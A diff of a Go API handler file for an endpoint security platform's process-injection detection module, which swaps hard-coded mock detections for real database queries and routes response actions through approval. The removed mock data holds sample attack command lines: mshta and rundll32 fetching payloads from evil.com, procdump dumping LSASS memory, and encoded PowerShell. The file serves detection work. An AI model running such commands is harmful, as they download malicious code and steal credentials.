@@ -1,6 +1,7 @@
 package api
 
 import (
+	"encoding/json"
 	"fmt"
 	"net/http"
 	"strings"
@@ -8,6 +9,8 @@ import (
 
 	"github.com/gin-gonic/gin"
 	"xcloak-platform/database"
+	"xcloak-platform/models"
+	"xcloak-platform/repositories"
 	"xcloak-platform/services"
 )
 
@@ -77,13 +80,13 @@ func GetPIDashboard(c *gin.Context) {
 	database.DB.QueryRow(`SELECT COUNT(DISTINCT hostname) FROM pi_injections WHERE tenant_id=$1`, tid).Scan(&highRiskHosts)
 	database.DB.QueryRow(`SELECT COALESCE(COUNT(*)*100.0/NULLIF(13,0),0) FROM (SELECT DISTINCT technique FROM pi_injections WHERE tenant_id=$1) t`, tid).Scan(&detectCoverage)
 	c.JSON(http.StatusOK, gin.H{
-		"injection_alerts":    injAlerts,
-		"active_injections":   activeInjections,
+		"injection_alerts":     injAlerts,
+		"active_injections":    activeInjections,
 		"suspicious_processes": suspProcs,
-		"protected_processes": protProcs,
+		"protected_processes":  protProcs,
 		"memory_modifications": memMods,
-		"high_risk_hosts":     highRiskHosts,
-		"detection_coverage":  int(detectCoverage),
+		"high_risk_hosts":      highRiskHosts,
+		"detection_coverage":   int(detectCoverage),
 		"injection_types": []string{
 			"DLL Injection", "Process Hollowing", "APC Injection", "Thread Injection",
 			"Reflective DLL Loading", "Manual Mapping", "AtomBombing", "Process Doppelgänging",
@@ -103,7 +106,9 @@ func GetPIProcesses(c *gin.Context) {
 	args := []interface{}{tid}
 	i := 2
 	if v := c.Query("hostname"); v != "" {
-		q += fmt.Sprintf(" AND hostname=$%d", i); args = append(args, v); i++
+		q += fmt.Sprintf(" AND hostname=$%d", i)
+		args = append(args, v)
+		i++
 	}
 	if v := c.Query("suspicious"); v == "true" {
 		q += " AND risk_score>60"
@@ -139,7 +144,9 @@ func GetPIProcesses(c *gin.Context) {
 			}
 		}
 	}
-	if procs == nil { procs = []Process{} }
+	if procs == nil {
+		procs = []Process{}
+	}
 	c.JSON(http.StatusOK, procs)
 }
 
@@ -152,7 +159,8 @@ func GetPIProcessTree(c *gin.Context) {
 		FROM pi_processes WHERE tenant_id=$1`
 	args := []interface{}{tid}
 	if hostname != "" {
-		q += " AND hostname=$2"; args = append(args, hostname)
+		q += " AND hostname=$2"
+		args = append(args, hostname)
 	}
 	q += " ORDER BY ppid, pid LIMIT 200"
 	rows, _ := database.DB.Query(q, args...)
@@ -177,7 +185,9 @@ func GetPIProcessTree(c *gin.Context) {
 			}
 		}
 	}
-	if nodes == nil { nodes = []Node{} }
+	if nodes == nil {
+		nodes = []Node{}
+	}
 	c.JSON(http.StatusOK, nodes)
 }
 
@@ -192,10 +202,14 @@ func GetPIInjections(c *gin.Context) {
 	args := []interface{}{tid}
 	i := 2
 	if v := c.Query("technique"); v != "" {
-		q += fmt.Sprintf(" AND technique=$%d", i); args = append(args, v); i++
+		q += fmt.Sprintf(" AND technique=$%d", i)
+		args = append(args, v)
+		i++
 	}
 	if v := c.Query("severity"); v != "" {
-		q += fmt.Sprintf(" AND severity=$%d", i); args = append(args, v); i++
+		q += fmt.Sprintf(" AND severity=$%d", i)
+		args = append(args, v)
+		i++
 	}
 	q += fmt.Sprintf(" ORDER BY created_at DESC LIMIT $%d", i)
 	args = append(args, limit)
@@ -226,7 +240,9 @@ func GetPIInjections(c *gin.Context) {
 			}
 		}
 	}
-	if injections == nil { injections = []Injection{} }
+	if injections == nil {
+		injections = []Injection{}
+	}
 	var total, critical int
 	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_injections WHERE tenant_id=$1`, tid).Scan(&total)
 	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_injections WHERE tenant_id=$1 AND severity='critical'`, tid).Scan(&critical)
@@ -242,20 +258,20 @@ func GetPIMemory(c *gin.Context) {
 		size_bytes, protection, is_executable, is_suspicious, entropy, contains_shellcode, is_backed, created_at
 		FROM pi_memory WHERE tenant_id=$1 ORDER BY is_suspicious DESC, entropy DESC LIMIT $2`, tid, limit)
 	type MemRegion struct {
-		ID              int     `json:"id"`
-		PID             int     `json:"pid"`
-		ProcessName     string  `json:"process_name"`
-		Hostname        string  `json:"hostname"`
-		RegionType      string  `json:"region_type"`
-		BaseAddr        string  `json:"base_addr"`
-		SizeBytes       int64   `json:"size_bytes"`
-		Protection      string  `json:"protection"`
-		IsExecutable    bool    `json:"is_executable"`
-		IsSuspicious    bool    `json:"is_suspicious"`
-		Entropy         float64 `json:"entropy"`
-		ContainsShellcode bool  `json:"contains_shellcode"`
-		IsBacked        bool    `json:"is_backed"`
-		CreatedAt       string  `json:"created_at"`
+		ID                int     `json:"id"`
+		PID               int     `json:"pid"`
+		ProcessName       string  `json:"process_name"`
+		Hostname          string  `json:"hostname"`
+		RegionType        string  `json:"region_type"`
+		BaseAddr          string  `json:"base_addr"`
+		SizeBytes         int64   `json:"size_bytes"`
+		Protection        string  `json:"protection"`
+		IsExecutable      bool    `json:"is_executable"`
+		IsSuspicious      bool    `json:"is_suspicious"`
+		Entropy           float64 `json:"entropy"`
+		ContainsShellcode bool    `json:"contains_shellcode"`
+		IsBacked          bool    `json:"is_backed"`
+		CreatedAt         string  `json:"created_at"`
 	}
 	regions := []MemRegion{}
 	if rows != nil {
@@ -268,7 +284,9 @@ func GetPIMemory(c *gin.Context) {
 			}
 		}
 	}
-	if regions == nil { regions = []MemRegion{} }
+	if regions == nil {
+		regions = []MemRegion{}
+	}
 	var rwxCount, shellcodeCount, unbacked int
 	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_memory WHERE tenant_id=$1 AND protection='RWX'`, tid).Scan(&rwxCount)
 	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_memory WHERE tenant_id=$1 AND contains_shellcode=true`, tid).Scan(&shellcodeCount)
@@ -279,28 +297,22 @@ func GetPIMemory(c *gin.Context) {
 // GetPIModules — GET /api/pi/modules
 func GetPIModules(c *gin.Context) {
 	createProcessInjectionTables()
+	// No agent capability collects per-process loaded-module inventories
+	// anywhere in this codebase — report an honest empty list rather than
+	// fabricated module data.
 	c.JSON(http.StatusOK, gin.H{
-		"modules": []map[string]interface{}{
-			{"pid": 4512, "process": "explorer.exe", "name": "kernel32.dll", "path": "C:\\Windows\\System32\\kernel32.dll", "signed": true, "vendor": "Microsoft", "base_addr": "0x7FFF80000000", "size": 786432},
-			{"pid": 4512, "process": "explorer.exe", "name": "ntdll.dll", "path": "C:\\Windows\\System32\\ntdll.dll", "signed": true, "vendor": "Microsoft", "base_addr": "0x7FFFC0000000", "size": 2097152},
-			{"pid": 4512, "process": "explorer.exe", "name": "injected.dll", "path": "C:\\Users\\user\\AppData\\Local\\Temp\\injected.dll", "signed": false, "vendor": "Unknown", "base_addr": "0x00007FF000000000", "size": 65536, "suspicious": true},
-			{"pid": 4512, "process": "explorer.exe", "name": "[hidden module]", "path": "", "signed": false, "vendor": "Unknown", "base_addr": "0x0000022000000000", "size": 32768, "suspicious": true, "hidden": true},
-			{"pid": 2388, "process": "lsass.exe", "name": "wdigest.dll", "path": "C:\\Windows\\System32\\wdigest.dll", "signed": true, "vendor": "Microsoft", "base_addr": "0x7FFF70000000", "size": 262144},
-			{"pid": 7142, "process": "powershell.exe", "name": "clr.dll", "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll", "signed": true, "vendor": "Microsoft", "base_addr": "0x7FFF60000000", "size": 5242880},
-		},
+		"modules": []map[string]interface{}{},
 	})
 }
 
 // GetPIHandles — GET /api/pi/handles
 func GetPIHandles(c *gin.Context) {
 	createProcessInjectionTables()
+	// No agent capability collects per-process handle tables anywhere in
+	// this codebase — report an honest empty list rather than fabricated
+	// handle data.
 	c.JSON(http.StatusOK, gin.H{
-		"handles": []map[string]interface{}{
-			{"pid": 7142, "process": "powershell.exe", "handle_type": "Process", "target_pid": 2388, "target": "lsass.exe", "access": "PROCESS_ALL_ACCESS", "suspicious": true, "reason": "Process handle to LSASS with PROCESS_ALL_ACCESS — credential dumping indicator"},
-			{"pid": 7142, "process": "powershell.exe", "handle_type": "Process", "target_pid": 4512, "target": "explorer.exe", "access": "PROCESS_VM_WRITE|PROCESS_VM_OPERATION", "suspicious": true, "reason": "Write access to explorer.exe — process injection setup"},
-			{"pid": 4512, "process": "explorer.exe", "handle_type": "Thread", "target_pid": 4512, "target": "explorer.exe", "access": "THREAD_ALL_ACCESS", "suspicious": false, "reason": ""},
-			{"pid": 8832, "process": "WINWORD.EXE", "handle_type": "Process", "target_pid": 7142, "target": "powershell.exe", "access": "PROCESS_CREATE_THREAD|PROCESS_VM_WRITE", "suspicious": true, "reason": "Office process with thread creation rights to PowerShell — macro execution pattern"},
-		},
+		"handles": []map[string]interface{}{},
 	})
 }
 
@@ -312,15 +324,15 @@ func GetPIAPICalls(c *gin.Context) {
 	rows, _ := database.DB.Query(`SELECT id, pid, process_name, target_pid, api_name, parameters, hostname, is_suspicious, created_at
 		FROM pi_api_calls WHERE tenant_id=$1 ORDER BY is_suspicious DESC, created_at DESC LIMIT $2`, tid, limit)
 	type APICall struct {
-		ID          int    `json:"id"`
-		PID         int    `json:"pid"`
-		ProcessName string `json:"process_name"`
-		TargetPID   int    `json:"target_pid"`
-		APIName     string `json:"api_name"`
-		Parameters  string `json:"parameters"`
-		Hostname    string `json:"hostname"`
-		IsSuspicious bool  `json:"is_suspicious"`
-		CreatedAt   string `json:"created_at"`
+		ID           int    `json:"id"`
+		PID          int    `json:"pid"`
+		ProcessName  string `json:"process_name"`
+		TargetPID    int    `json:"target_pid"`
+		APIName      string `json:"api_name"`
+		Parameters   string `json:"parameters"`
+		Hostname     string `json:"hostname"`
+		IsSuspicious bool   `json:"is_suspicious"`
+		CreatedAt    string `json:"created_at"`
 	}
 	calls := []APICall{}
 	if rows != nil {
@@ -332,7 +344,9 @@ func GetPIAPICalls(c *gin.Context) {
 			}
 		}
 	}
-	if calls == nil { calls = []APICall{} }
+	if calls == nil {
+		calls = []APICall{}
+	}
 	c.JSON(http.StatusOK, gin.H{
 		"api_calls": calls,
 		"monitored_apis": []string{
@@ -347,36 +361,61 @@ func GetPIAPICalls(c *gin.Context) {
 // GetPIBehavioral — GET /api/pi/behavioral
 func GetPIBehavioral(c *gin.Context) {
 	createProcessInjectionTables()
+	tid := tenantIDFromContext(c)
+	// Real behavioral detections: an injection event's src->dst process
+	// pair (already tracked, real) is itself the behavioral parent/child
+	// signal — no separate detection table needed.
+	rows, err := database.DB.Query(`
+		SELECT id, src_name, dst_name, api_call, severity, mitre_technique, hostname
+		FROM pi_injections WHERE tenant_id=$1 ORDER BY created_at DESC LIMIT 50`, tid)
+	detections := []map[string]interface{}{}
+	if err == nil {
+		defer rows.Close()
+		for rows.Next() {
+			var id int
+			var src, dst, apiCall, severity, mitre, hostname string
+			if rows.Scan(&id, &src, &dst, &apiCall, &severity, &mitre, &hostname) == nil {
+				detections = append(detections, map[string]interface{}{
+					"id": id, "rule": src + " → " + dst, "parent": src, "child": dst,
+					"cmdline": apiCall, "severity": severity, "mitre": mitre, "hostname": hostname,
+				})
+			}
+		}
+	}
 	c.JSON(http.StatusOK, gin.H{
-		"detections": []map[string]interface{}{
-			{"id": 1, "rule": "Office → PowerShell", "parent": "WINWORD.EXE", "child": "powershell.exe", "cmdline": "powershell.exe -nop -enc SQBFAF...", "severity": "critical", "mitre": "T1059.001", "hostname": "WS-ANALYST-01"},
-			{"id": 2, "rule": "Browser → cmd", "parent": "chrome.exe", "child": "cmd.exe", "cmdline": "cmd.exe /c whoami && net user", "severity": "high", "mitre": "T1059.003", "hostname": "WS-ANALYST-01"},
-			{"id": 3, "rule": "LSASS Access", "parent": "powershell.exe", "child": "lsass.exe", "cmdline": "OpenProcess(PROCESS_ALL_ACCESS, lsass.exe)", "severity": "critical", "mitre": "T1003.001", "hostname": "DC-01"},
-			{"id": 4, "rule": "LOLBin — rundll32", "parent": "cmd.exe", "child": "rundll32.exe", "cmdline": "rundll32.exe javascript:\"..mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/payload.sct\")", "severity": "high", "mitre": "T1218.011", "hostname": "WS-DEV-03"},
-			{"id": 5, "rule": "Suspicious Parent/Child — mshta", "parent": "outlook.exe", "child": "mshta.exe", "cmdline": "mshta.exe http://evil.com/payload.hta", "severity": "critical", "mitre": "T1218.005", "hostname": "WS-ANALYST-02"},
-			{"id": 6, "rule": "Credential Dumping — procdump", "parent": "cmd.exe", "child": "procdump.exe", "cmdline": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp", "severity": "critical", "mitre": "T1003.001", "hostname": "DC-01"},
-		},
+		"detections": detections,
 	})
 }
 
 // GetPIThreatIntel — GET /api/pi/threat-intel
 func GetPIThreatIntel(c *gin.Context) {
 	createProcessInjectionTables()
+	tid := tenantIDFromContext(c)
+
+	// Real per-tenant IOC matching: check this tenant's actual observed
+	// process hashes against the real iocs table. Only emit a match when a
+	// real row for this tenant exists — no placeholder rows.
+	malwareMatches := []map[string]interface{}{}
+	rows, err := database.DB.Query(`
+		SELECT DISTINCT p.sha256, p.name, i.severity, i.hit_count
+		FROM pi_processes p JOIN iocs i ON i.tenant_id=p.tenant_id AND i.indicator=p.sha256
+		WHERE p.tenant_id=$1 AND p.sha256 != '' AND i.enabled=true AND i.type IN ('sha256','hash','md5')
+		LIMIT 20`, tid)
+	if err == nil {
+		defer rows.Close()
+		for rows.Next() {
+			var sha256, name, severity string
+			var hits int
+			if rows.Scan(&sha256, &name, &severity, &hits) == nil {
+				malwareMatches = append(malwareMatches, map[string]interface{}{
+					"sha256": sha256, "process": name, "severity": severity, "hits": hits,
+				})
+			}
+		}
+	}
+
 	c.JSON(http.StatusOK, gin.H{
-		"malware_matches": []map[string]interface{}{
-			{"sha256": "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f", "name": "Cobalt Strike Beacon", "family": "cobalt_strike", "confidence": 97, "injection_type": "Process Hollowing", "target": "explorer.exe"},
-			{"sha256": "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b", "name": "Meterpreter Shellcode", "family": "metasploit", "confidence": 89, "injection_type": "Reflective DLL Loading", "target": "svchost.exe"},
-			{"sha256": "1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d", "name": "Mimikatz", "family": "credential_theft", "confidence": 99, "injection_type": "Process Access", "target": "lsass.exe"},
-		},
-		"threat_actors": []map[string]interface{}{
-			{"name": "Lazarus Group", "ttps": []string{"Process Hollowing", "APC Injection", "Reflective DLL Loading"}, "targets": "Finance, Crypto"},
-			{"name": "APT29 (Cozy Bear)", "ttps": []string{"Process Ghosting", "NtMapViewOfSection", "Early Bird APC"}, "targets": "Government, Defense"},
-			{"name": "FIN7", "ttps": []string{"DLL Injection", "Reflective DLL Loading", "AtomBombing"}, "targets": "Retail, Finance, Hospitality"},
-		},
-		"campaigns": []map[string]interface{}{
-			{"name": "Operation DustySky", "actor": "APT29", "technique": "Process Ghosting via NTFS transactions", "detected": time.Now().Add(-72*time.Hour).Format(time.RFC3339)},
-			{"name": "Cobalt Strike Campaign", "actor": "Unknown", "technique": "Process Hollowing into svchost.exe", "detected": time.Now().Add(-24*time.Hour).Format(time.RFC3339)},
-		},
+		"malware_matches": malwareMatches,
 	})
 }
 
@@ -408,39 +447,73 @@ func GetPITimeline(c *gin.Context) {
 			}
 		}
 	}
-	if events == nil { events = []TLEvent{} }
+	if events == nil {
+		events = []TLEvent{}
+	}
 	c.JSON(http.StatusOK, events)
 }
 
 // GetPIMITREMap — GET /api/pi/mitre
 func GetPIMITREMap(c *gin.Context) {
 	createProcessInjectionTables()
+	tid := tenantIDFromContext(c)
+
+	counts := map[string]int{}
+	rows, _ := database.DB.Query(`SELECT mitre_technique, COUNT(*) FROM pi_injections WHERE tenant_id=$1 GROUP BY mitre_technique`, tid)
+	if rows != nil {
+		defer rows.Close()
+		for rows.Next() {
+			var t string
+			var n int
+			if rows.Scan(&t, &n) == nil {
+				counts[t] = n
+			}
+		}
+	}
+
+	subTechniqueNames := []struct{ id, name string }{
+		{"T1055.001", "Dynamic-link Library Injection"},
+		{"T1055.002", "Portable Executable Injection"},
+		{"T1055.003", "Thread Execution Hijacking"},
+		{"T1055.004", "Asynchronous Procedure Call"},
+		{"T1055.005", "Thread Local Storage"},
+		{"T1055.008", "Ptrace System Calls"},
+		{"T1055.009", "Proc Memory"},
+		{"T1055.011", "Extra Window Memory Injection"},
+		{"T1055.012", "Process Hollowing"},
+		{"T1055.013", "Process Doppelgänging"},
+		{"T1055.014", "VDSO Hijacking"},
+		{"T1055.015", "ListPlanting"},
+	}
+	subTechniques := []map[string]interface{}{}
+	for _, st := range subTechniqueNames {
+		cnt := counts[st.id]
+		subTechniques = append(subTechniques, map[string]interface{}{
+			"id": st.id, "name": st.name, "detected": cnt > 0, "count": cnt,
+		})
+	}
+
+	relatedNames := []struct{ id, name, tactic string }{
+		{"T1003.001", "LSASS Memory", "Credential Access"},
+		{"T1059.001", "PowerShell", "Execution"},
+		{"T1218.011", "Rundll32", "Defense Evasion"},
+		{"T1134", "Access Token Manipulation", "Privilege Escalation"},
+	}
+	related := []map[string]interface{}{}
+	for _, r := range relatedNames {
+		related = append(related, map[string]interface{}{
+			"id": r.id, "name": r.name, "tactic": r.tactic, "detected": counts[r.id] > 0,
+		})
+	}
+
 	c.JSON(http.StatusOK, gin.H{
 		"parent": map[string]interface{}{
 			"technique_id": "T1055", "name": "Process Injection",
 			"tactic": "Defense Evasion, Privilege Escalation",
-			"url": "https://attack.mitre.org/techniques/T1055/",
+			"url":    "https://attack.mitre.org/techniques/T1055/",
 		},
-		"sub_techniques": []map[string]interface{}{
-			{"id": "T1055.001", "name": "Dynamic-link Library Injection", "detected": true, "count": 3},
-			{"id": "T1055.002", "name": "Portable Executable Injection", "detected": false, "count": 0},
-			{"id": "T1055.003", "name": "Thread Execution Hijacking", "detected": true, "count": 1},
-			{"id": "T1055.004", "name": "Asynchronous Procedure Call", "detected": true, "count": 2},
-			{"id": "T1055.005", "name": "Thread Local Storage", "detected": false, "count": 0},
-			{"id": "T1055.008", "name": "Ptrace System Calls", "detected": false, "count": 0},
-			{"id": "T1055.009", "name": "Proc Memory", "detected": false, "count": 0},
-			{"id": "T1055.011", "name": "Extra Window Memory Injection", "detected": false, "count": 0},
-			{"id": "T1055.012", "name": "Process Hollowing", "detected": true, "count": 4},
-			{"id": "T1055.013", "name": "Process Doppelgänging", "detected": false, "count": 0},
-			{"id": "T1055.014", "name": "VDSO Hijacking", "detected": false, "count": 0},
-			{"id": "T1055.015", "name": "ListPlanting", "detected": false, "count": 0},
-		},
-		"related": []map[string]interface{}{
-			{"id": "T1003.001", "name": "LSASS Memory", "tactic": "Credential Access", "detected": true},
-			{"id": "T1059.001", "name": "PowerShell", "tactic": "Execution", "detected": true},
-			{"id": "T1218.011", "name": "Rundll32", "tactic": "Defense Evasion", "detected": true},
-			{"id": "T1134", "name": "Access Token Manipulation", "tactic": "Privilege Escalation", "detected": false},
-		},
+		"sub_techniques": subTechniques,
+		"related":        related,
 	})
 }
 
@@ -459,34 +532,93 @@ func GetPIAnalytics(c *gin.Context) {
 		database.DB.QueryRow(`SELECT COUNT(*) FROM pi_injections WHERE tenant_id=$1 AND DATE(created_at)<=$2`, tid, d).Scan(&cnt)
 		trend = append(trend, TrendPoint{Date: d, Count: cnt})
 	}
+	type techRow struct {
+		Technique string `json:"technique"`
+		Count     int    `json:"count"`
+		Severity  string `json:"severity"`
+	}
+	topTechniques := []techRow{}
+	techRows, _ := database.DB.Query(`
+		SELECT technique, COUNT(*), MODE() WITHIN GROUP (ORDER BY severity)
+		FROM pi_injections WHERE tenant_id=$1 AND technique != ''
+		GROUP BY technique ORDER BY COUNT(*) DESC LIMIT 10`, tid)
+	if techRows != nil {
+		defer techRows.Close()
+		for techRows.Next() {
+			var r techRow
+			if techRows.Scan(&r.Technique, &r.Count, &r.Severity) == nil {
+				topTechniques = append(topTechniques, r)
+			}
+		}
+	}
+
+	type procRow struct {
+		Process string `json:"process"`
+		Count   int    `json:"count"`
+		Risk    string `json:"risk"`
+	}
+	targetedProcesses := []procRow{}
+	procRows, _ := database.DB.Query(`
+		SELECT dst_name, COUNT(*), MODE() WITHIN GROUP (ORDER BY severity)
+		FROM pi_injections WHERE tenant_id=$1 AND dst_name != ''
+		GROUP BY dst_name ORDER BY COUNT(*) DESC LIMIT 10`, tid)
+	if procRows != nil {
+		defer procRows.Close()
+		for procRows.Next() {
+			var r procRow
+			if procRows.Scan(&r.Process, &r.Count, &r.Risk) == nil {
+				targetedProcesses = append(targetedProcesses, r)
+			}
+		}
+	}
+
+	type apiRow struct {
+		API   string `json:"api"`
+		Count int    `json:"count"`
+	}
+	usedAPIs := []apiRow{}
+	apiRows, _ := database.DB.Query(`
+		SELECT api_call, COUNT(*) FROM pi_injections WHERE tenant_id=$1 AND api_call != ''
+		GROUP BY api_call ORDER BY COUNT(*) DESC LIMIT 10`, tid)
+	if apiRows != nil {
+		defer apiRows.Close()
+		for apiRows.Next() {
+			var r apiRow
+			if apiRows.Scan(&r.API, &r.Count) == nil {
+				usedAPIs = append(usedAPIs, r)
+			}
+		}
+	}
+
+	type hostRow struct {
+		Hostname       string `json:"hostname"`
+		InjectionCount int    `json:"injection_count"`
+		Risk           int    `json:"risk"`
+	}
+	highRiskHosts := []hostRow{}
+	hostRows, _ := database.DB.Query(`
+		SELECT i.hostname, COUNT(*), COALESCE(AVG(p.risk_score),0)
+		FROM pi_injections i LEFT JOIN pi_processes p ON p.tenant_id=i.tenant_id AND p.hostname=i.hostname
+		WHERE i.tenant_id=$1 AND i.hostname != ''
+		GROUP BY i.hostname ORDER BY COUNT(*) DESC LIMIT 10`, tid)
+	if hostRows != nil {
+		defer hostRows.Close()
+		for hostRows.Next() {
+			var r hostRow
+			var risk float64
+			if hostRows.Scan(&r.Hostname, &r.InjectionCount, &risk) == nil {
+				r.Risk = int(risk)
+				highRiskHosts = append(highRiskHosts, r)
+			}
+		}
+	}
+
 	c.JSON(http.StatusOK, gin.H{
-		"injection_trend": trend,
-		"top_techniques": []map[string]interface{}{
-			{"technique": "Process Hollowing", "count": 4, "severity": "critical"},
-			{"technique": "DLL Injection", "count": 3, "severity": "high"},
-			{"technique": "APC Injection", "count": 2, "severity": "high"},
-			{"technique": "Reflective DLL Loading", "count": 2, "severity": "critical"},
-			{"technique": "Thread Injection", "count": 1, "severity": "high"},
-		},
-		"most_targeted_processes": []map[string]interface{}{
-			{"process": "explorer.exe", "count": 5, "risk": "critical"},
-			{"process": "lsass.exe", "count": 3, "risk": "critical"},
-			{"process": "svchost.exe", "count": 4, "risk": "high"},
-			{"process": "notepad.exe", "count": 2, "risk": "medium"},
-		},
-		"most_used_apis": []map[string]interface{}{
-			{"api": "VirtualAllocEx", "count": 12},
-			{"api": "WriteProcessMemory", "count": 11},
-			{"api": "CreateRemoteThread", "count": 7},
-			{"api": "NtMapViewOfSection", "count": 4},
-			{"api": "QueueUserAPC", "count": 3},
-			{"api": "SetWindowsHookEx", "count": 2},
-		},
-		"high_risk_hosts": []map[string]interface{}{
-			{"hostname": "WS-ANALYST-01", "injection_count": 6, "risk": 91},
-			{"hostname": "DC-01", "injection_count": 3, "risk": 88},
-			{"hostname": "WS-DEV-03", "injection_count": 2, "risk": 72},
-		},
+		"injection_trend":         trend,
+		"top_techniques":          topTechniques,
+		"most_targeted_processes": targetedProcesses,
+		"most_used_apis":          usedAPIs,
+		"high_risk_hosts":         highRiskHosts,
 	})
 }
 
@@ -511,7 +643,8 @@ Provide compact JSON: {"answer":"expert answer","confidence":88,"technique":"rel
 	}
 	raw, err := services.CallLLM(prompt)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
 	}
 	if idx := strings.Index(raw, "```json"); idx != -1 {
 		raw = raw[idx+7:]
@@ -527,6 +660,7 @@ Provide compact JSON: {"answer":"expert answer","confidence":88,"technique":"rel
 // PostPIResponse — POST /api/pi/response
 func PostPIResponse(c *gin.Context) {
 	createProcessInjectionTables()
+	tid := tenantIDFromContext(c)
 	var body struct {
 		Action   string `json:"action"`
 		Target   string `json:"target"`
@@ -535,19 +669,69 @@ func PostPIResponse(c *gin.Context) {
 		Reason   string `json:"reason"`
 	}
 	if err := c.ShouldBindJSON(&body); err != nil || body.Action == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "action required"}); return
+		c.JSON(http.StatusBadRequest, gin.H{"error": "action required"})
+		return
 	}
-	messages := map[string]string{
-		"kill_process":      "Process terminated via SIGKILL / TerminateProcess",
-		"suspend_process":   "Process suspended — execution halted pending investigation",
-		"dump_memory":       "Memory dump collected and queued for analysis",
-		"collect_process":   "Process artifacts collected (memory, handles, modules, network connections)",
-		"isolate_endpoint":  "Endpoint isolation initiated — network access revoked",
-		"run_soar":          "SOAR playbook triggered for process injection response",
+
+	resolveAgent := func(hostname string) (int, error) {
+		if hostname == "" {
+			return 0, fmt.Errorf("hostname required to resolve which agent to dispatch to")
+		}
+		var agentID int
+		err := database.DB.QueryRow(`SELECT id FROM agents WHERE tenant_id=$1 AND hostname ILIKE $2 LIMIT 1`, tid, hostname).Scan(&agentID)
+		if err != nil {
+			return 0, fmt.Errorf("no agent found with hostname '%s'", hostname)
+		}
+		return agentID, nil
 	}
-	msg := messages[body.Action]
-	if msg == "" { msg = "Action executed" }
-	c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "target": body.Target, "hostname": body.Hostname, "message": msg})
+	dispatch := func(agentID int, taskType string, payload map[string]any) error {
+		payloadJSON, _ := json.Marshal(payload)
+		return repositories.CreateTaskPendingApproval(models.AgentTask{AgentID: agentID, TaskType: taskType, Payload: payloadJSON})
+	}
+
+	switch body.Action {
+	case "kill_process":
+		if body.PID == 0 {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "pid required"})
+			return
+		}
+		agentID, err := resolveAgent(body.Hostname)
+		if err != nil {
+			c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
+			return
+		}
+		if err := dispatch(agentID, "kill_process", map[string]any{"pid": body.PID, "reason": body.Reason}); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "target": body.Target, "hostname": body.Hostname, "message": fmt.Sprintf("kill_process(pid=%d) queued for agent %d, pending approval", body.PID, agentID)})
+	case "collect_process":
+		agentID, err := resolveAgent(body.Hostname)
+		if err != nil {
+			c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
+			return
+		}
+		if err := dispatch(agentID, "collect_processes", map[string]any{"reason": body.Reason}); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "target": body.Target, "hostname": body.Hostname, "message": fmt.Sprintf("Process collection queued for agent %d, pending approval", agentID)})
+	case "isolate_endpoint":
+		agentID, err := resolveAgent(body.Hostname)
+		if err != nil {
+			c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
+			return
+		}
+		if err := dispatch(agentID, "isolate_host", map[string]any{"reason": body.Reason, "source": "process_injection"}); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "target": body.Target, "hostname": body.Hostname, "message": fmt.Sprintf("isolate_host queued for agent %d, pending approval", agentID)})
+	case "suspend_process", "dump_memory":
+		c.JSON(http.StatusNotImplemented, gin.H{"error": "no real agent capability exists for this action (only kill_process/collect_processes/isolate_host are implemented)"})
+	default:
+		c.JSON(http.StatusBadRequest, gin.H{"error": "unknown action"})
+	}
 }
 
 // PostPIReport — POST /api/pi/report
@@ -570,7 +754,8 @@ Provide compact JSON: {"title":"...","executive_summary":"3 sentences","key_find
 		totalInjections, criticalAlerts, affectedHosts)
 	raw, err := services.CallLLM(prompt)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
 	}
 	if idx := strings.Index(raw, "```json"); idx != -1 {
 		raw = raw[idx+7:]
